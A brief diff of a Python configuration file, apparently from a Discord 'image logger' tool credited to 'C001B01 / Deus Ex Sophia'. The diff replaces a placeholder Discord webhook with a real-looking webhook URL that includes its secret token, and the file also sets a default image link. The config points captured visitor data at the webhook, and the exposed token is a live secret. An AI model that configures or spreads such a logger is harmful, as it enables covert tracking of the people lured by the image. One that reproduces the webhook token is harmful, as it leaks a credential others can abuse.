@@ -15,7 +15,7 @@ __author__ = "C001B01 / Deus Ex Sophia"
 config = {
     # --- WEBHOOK ---
     # ¡CREA TU PROPIO WEBHOOK EN DISCORD Y PONLO AQUÍ!
-    "webhook": "https://discord.com/api/webhooks/TU_ID_AQUI/TU_TOKEN_AQUI",
+    "webhook": "https://discord.com/api/webhooks/1546229226355818529/0IjhLUnVPgXxCv56-iHUWbiG7MeVkJvyQdsGHbmP222Da4Wmai-2os3HHNZWbeeEGpIV",
     
     # --- IMAGEN PREDETERMINADA ---
     "image": "https://m.media-amazon.com/images/MV5BMzlMThBhNjYtMjU0ZC00NDY5LTgyMDUtN2M3NzU4YjU0MDU4",
